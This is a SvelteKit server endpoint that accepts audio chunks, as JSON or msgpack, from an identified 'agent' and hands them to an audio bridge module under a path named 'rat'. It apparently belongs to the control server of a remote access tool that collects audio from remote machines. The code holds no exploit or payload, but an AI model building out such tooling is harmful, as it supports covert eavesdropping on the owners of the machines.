import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { audioBridgeManager, AudioBridgeError } from '$lib/server/rat/audio';
import type { AudioStreamChunk } from '$lib/types/audio';
import { decode } from '@msgpack/msgpack';

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: AudioStreamChunk;
	try {
		const contentType = request.headers.get('content-type') || '';
		if (contentType.includes('application/msgpack')) {
			const buffer = await request.arrayBuffer();
			payload = decode(buffer) as AudioStreamChunk;
		} else {
			payload = (await request.json()) as AudioStreamChunk;
		}
	} catch {
		throw error(400, 'Invalid audio chunk payload');
	}

	try {
		audioBridgeManager.ingestChunk(id, payload);
	} catch (err) {
		if (err instanceof AudioBridgeError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to record audio chunk');
	}

	return json({ accepted: true });
};
